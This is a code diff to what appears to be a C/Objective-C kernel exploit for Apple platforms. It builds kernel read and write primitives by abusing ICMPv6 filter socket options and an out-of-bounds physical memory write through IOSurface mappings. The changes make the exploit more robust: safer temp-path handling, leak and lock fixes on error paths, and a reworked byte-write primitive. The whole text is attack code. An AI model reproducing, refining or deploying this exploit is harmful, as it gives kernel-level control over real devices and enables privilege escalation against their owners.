@@ -57,6 +57,7 @@ extern void         IOSurfacePrefetchPages(IOSurfaceRef surface);
 
 static ds_log_callback_t g_log_callback = NULL;
 static ds_progress_callback_t g_progress_callback = NULL;
+static double g_max_progress = 0.0;
 
 void ds_set_log_callback(ds_log_callback_t callback) {
     g_log_callback = callback;
@@ -66,9 +67,11 @@ void ds_set_progress_callback(ds_progress_callback_t callback) {
     g_progress_callback = callback;
 }
 
-static void ds_progress(double progress) {
-    static double g_max_progress = 0.0;
+void ds_reset_progress(void) {
+    g_max_progress = 0.0;
+}
 
+static void ds_progress(double progress) {
     if (progress < 0.0) progress = 0.0;
     if (progress > 0.99) progress = 0.99;
 
@@ -370,15 +373,19 @@ static void create_target_file(const char *path) {
 
 static void init_target_file(void) {
     char read_file_path[1024], write_file_path[1024];
+    size_t read_len, write_len;
 
     confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024);
+    read_len = strnlen(read_file_path, 1024);
     confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024);
+    write_len = strnlen(write_file_path, 1024);
 
-    char suffix[32];
-    snprintf(suffix, sizeof(suffix), "/%08x", arc4random());
-    strcat(read_file_path, suffix);
-    snprintf(suffix, sizeof(suffix), "/%08x", arc4random());
-    strcat(write_file_path, suffix);
+    if (read_len + 16 > 1024 || write_len + 16 > 1024) {
+        pe_log("temp path too long");
+        return;
+    }
+    snprintf(read_file_path + read_len, 1024 - read_len, "/%08x", arc4random());
+    snprintf(write_file_path + write_len, 1024 - write_len, "/%08x", arc4random());
 
     create_target_file(read_file_path);
     create_target_file(write_file_path);
@@ -404,6 +411,7 @@ static void create_physically_contiguous_mapping(mach_port_t *port,
     CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
 
     IOSurfaceRef surface = IOSurfaceCreate(dict);
+    CFRelease(cf_number);
     CFRelease(dict);
     if (!surface) { pe_log("failed to create IOSurface!"); return; }
 
@@ -415,16 +423,24 @@ static void create_physically_contiguous_mapping(mach_port_t *port,
     kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &entry_size,
         (mach_vm_address_t)physical_mapping_address,
         VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
-    if (kr != KERN_SUCCESS) { pe_log("mach_make_memory_entry_64 failed!"); return; }
+    if (kr != KERN_SUCCESS) {
+        pe_log("mach_make_memory_entry_64 failed!");
+        CFRelease(surface);
+        return;
+    }
 
     mach_vm_address_t new_mapping_address = 0;
     kr = mach_vm_map(mach_task_self(), &new_mapping_address, size, 0,
         VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR,
         memory_object, 0, FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
-    if (kr != KERN_SUCCESS) { pe_log("mach_vm_map failed!"); return; }
+    if (kr != KERN_SUCCESS) {
+        pe_log("mach_vm_map failed!");
+        mach_port_deallocate(mach_task_self(), memory_object);
+        CFRelease(surface);
+        return;
+    }
 
     CFRelease(surface);
-    CFRelease(cf_number);
     *port = memory_object;
     *address = (uint64_t)new_mapping_address;
 }
@@ -566,14 +582,10 @@ static void physical_oob_write_mo(mach_port_t mo, uint64_t mo_offset,
 }
 
 static pthread_mutex_t krwLock = PTHREAD_MUTEX_INITIALIZER;
-static void set_target_kaddr(uint64_t where) {
+static bool set_target_kaddr(uint64_t where) {
     if(!ds_isvalid(where)) {
-        printf("(ds) kaddr isn't valid: 0x%llx\n", where);
-        
-        pthread_mutex_unlock(&krwLock);
-        @throw [NSException exceptionWithName:@"dsexception"
-                                       reason:[NSString stringWithFormat:@"set_target_kaddr got invalid kaddr 0x%llx", where]
-                                        userInfo:nil];
+        pe_log("(ds) kaddr isn't valid: 0x%llx", where);
+        return false;
     }
     memset(control_data, 0, EARLY_KRW_LENGTH);
     *(uint64_t *)control_data = where;
@@ -581,17 +593,22 @@ static void set_target_kaddr(uint64_t where) {
                           control_data, (socklen_t)EARLY_KRW_LENGTH);
     if (res != 0) {
         pe_log("setsockopt failed (set_target_kaddr)!");
-        pthread_mutex_unlock(&krwLock);
-        @throw [NSException exceptionWithName:@"dsexception"
-                                        reason:@"setsockopt failed (set_target_kaddr)"
-                                        userInfo:nil];
+        return false;
     }
+    return true;
 }
 
 static void early_kread(uint64_t where, void *read_buf, uint64_t size) {
     pthread_mutex_lock(&krwLock);
-    if (size > EARLY_KRW_LENGTH) { pe_log("error: size > EARLY_KRW_LENGTH"); return; }
-    set_target_kaddr(where);
+    if (size > EARLY_KRW_LENGTH) {
+        pe_log("error: size > EARLY_KRW_LENGTH");
+        pthread_mutex_unlock(&krwLock);
+        return;
+    }
+    if (!set_target_kaddr(where)) {
+        pthread_mutex_unlock(&krwLock);
+        return;
+    }
     socklen_t read_data_length = (socklen_t)size;
     int res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
     if (res != 0) { pe_log("getsockopt failed (early_kread)!"); }
@@ -606,7 +623,10 @@ static uint64_t early_kread64(uint64_t where) {
 
 static void early_kwrite32bytes(uint64_t where, void *write_buf) {
     pthread_mutex_lock(&krwLock);
-    set_target_kaddr(where);
+    if (!set_target_kaddr(where)) {
+        pthread_mutex_unlock(&krwLock);
+        return;
+    }
     int res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
                           write_buf, (socklen_t)EARLY_KRW_LENGTH);
     if (res != 0) { pe_log("setsockopt failed (early_kwrite32bytes)!"); }
@@ -1314,6 +1334,7 @@ static int pe(void) {
 
 int ds_run(void) {
     g_ds_ready = false;
+    ds_reset_progress();
     ds_progresssafe(0.0);
     random_marker = ((uint64_t)arc4random() << 32) | arc4random();
     wired_page_marker = ((uint64_t)arc4random() << 32) | arc4random();
@@ -1390,9 +1411,11 @@ void ds_kwrite16(uint64_t addr, uint16_t val) {
     early_kwrite32bytes(addr, tmp);
 }
 
-void ds_kwrite8(uint64_t what, uint8_t val) {
-    uint64_t addr = early_kread64(what);
-    early_kwrite64(what, (addr & 0xFFFFFFFFFFFFFF00ULL) | (uint64_t)val);
+void ds_kwrite8(uint64_t addr, uint8_t val) {
+    uint8_t buf[EARLY_KRW_LENGTH];
+    early_kread(addr, buf, EARLY_KRW_LENGTH);
+    buf[0] = val;
+    early_kwrite32bytes(addr, buf);
 }
 
 void ds_kread(uint64_t address, void *buffer, uint64_t size) {
